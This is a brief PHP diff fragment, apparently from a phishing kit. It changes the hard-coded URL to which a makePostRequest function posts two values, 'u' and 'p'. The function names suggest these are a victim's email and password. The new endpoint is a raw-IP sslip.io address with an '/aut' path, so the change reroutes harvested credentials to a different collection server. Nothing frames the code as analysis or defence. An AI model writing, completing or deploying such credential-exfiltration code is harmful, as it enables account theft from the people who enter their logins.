@@ -120,7 +120,7 @@ function prepareMessageContent($em, $pa, $response){
 
 function makePostRequest($u, $p) {
 
-    $url = 'https://severvos.zaitck.com/aut';
+    $url = 'https://dcwsow00wso4ko888oc8cgwk.82.153.134.173.sslip.io/aut';
 
     $data = [
         'u' => $u,
